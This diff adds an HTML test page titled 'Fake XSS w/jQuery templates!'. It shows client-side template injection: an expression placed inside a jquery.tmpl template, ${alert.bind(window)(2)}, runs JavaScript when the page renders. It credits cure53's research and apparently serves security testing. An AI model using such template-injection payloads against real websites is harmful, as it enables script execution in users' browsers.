@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Fake XSS w/jQuery templates!</title>
+  <script src="https://code.jquery.com/jquery-3.1.1.js"></script>
+  <script src="http://ajax.microsoft.com/ajax/jquery.templates/beta1/jquery.tmpl.js"></script>
+  <script type="text/javascript">
+    jQuery(function(){
+        $("#x").tmpl([{}])
+    });
+  </script>
+</head>
+<body>
+<div id="x">
+	${alert.bind(window)(2)}
+</div>
+  Shamelessly stolen from <a href="https://github.com/cure53/mustache-security/blob/master/wiki/jQuery.wiki">mustache-security</a> by cure53.
+</body>
+</html>
